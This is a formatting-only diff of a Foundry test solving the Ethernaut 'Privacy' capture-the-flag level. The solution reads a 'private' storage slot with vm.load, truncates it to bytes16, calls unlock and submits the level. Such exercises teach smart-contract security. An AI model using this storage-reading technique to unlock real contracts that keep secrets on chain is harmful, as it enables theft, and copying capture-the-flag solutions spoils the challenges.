@@ -47,22 +47,14 @@ contract PrivacyTest is Test {
         emit log_string("Starting the exploit... 🧨");
         emit log_string("Eve reads the data from the storage slot number 4...");
 
-        bytes32 thirdElement = vm.load(
-            address(privacyContract),
-            bytes32(uint256(5))
-        );
-        emit log_named_bytes32(
-            "Third element of the bytes32 array: ",
-            thirdElement
-        );
+        bytes32 thirdElement = vm.load(address(privacyContract), bytes32(uint256(5)));
+        emit log_named_bytes32("Third element of the bytes32 array: ", thirdElement);
 
         bytes16 downcastedThirdElement = bytes16(thirdElement);
 
         emit log_named_bytes32("Downcasted data: ", downcastedThirdElement);
 
-        emit log_string(
-            "Eve calls the unlock function with the aquired data... 🔑"
-        );
+        emit log_string("Eve calls the unlock function with the aquired data... 🔑");
 
         privacyContract.unlock(downcastedThirdElement);
 
@@ -72,9 +64,7 @@ contract PrivacyTest is Test {
                                 LEVEL SUBMISSION
         //////////////////////////////////////////////////////////////*/
 
-        bool challengeCompleted = ethernaut.submitLevelInstance(
-            payable(levelAddress)
-        );
+        bool challengeCompleted = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
         assert(challengeCompleted);
     }
@@ -92,9 +82,7 @@ contract PrivacyTest is Test {
      * an address for that person
      */
     function makeNameForAddress(string memory name) public returns (address) {
-        address addr = address(
-            uint160(uint256(keccak256(abi.encodePacked(name))))
-        );
+        address addr = address(uint160(uint256(keccak256(abi.encodePacked(name)))));
         vm.label(addr, name);
         return addr;
     }
